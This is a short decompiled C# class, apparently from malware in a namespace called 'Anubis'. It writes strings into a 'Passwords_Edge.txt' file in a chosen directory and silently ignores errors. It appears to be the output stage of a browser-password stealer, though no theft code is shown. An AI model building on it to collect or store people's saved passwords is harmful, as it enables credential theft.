using System;
using System.Collections.Generic;
using System.IO;

namespace Anubis
{
	// Token: 0x0200004A RID: 74
	public static class DesktopWriter
	{
		// Token: 0x06000221 RID: 545 RVA: 0x0000F318 File Offset: 0x0000D518
		public static void SetDirectory(string dir)
		{
			try
			{
				DesktopWriter.directory = dir;
			}
			catch
			{
			}
		}

		// Token: 0x06000222 RID: 546 RVA: 0x0000F340 File Offset: 0x0000D540
		public static void WriteLine(string str)
		{
			try
			{
				File.AppendAllLines(Path.Combine(DesktopWriter.directory, "Passwords_Edge.txt"), new List<string>
				{
					str
				});
			}
			catch
			{
			}
		}

		// Token: 0x040000BC RID: 188
		private static string directory = "";
	}
}
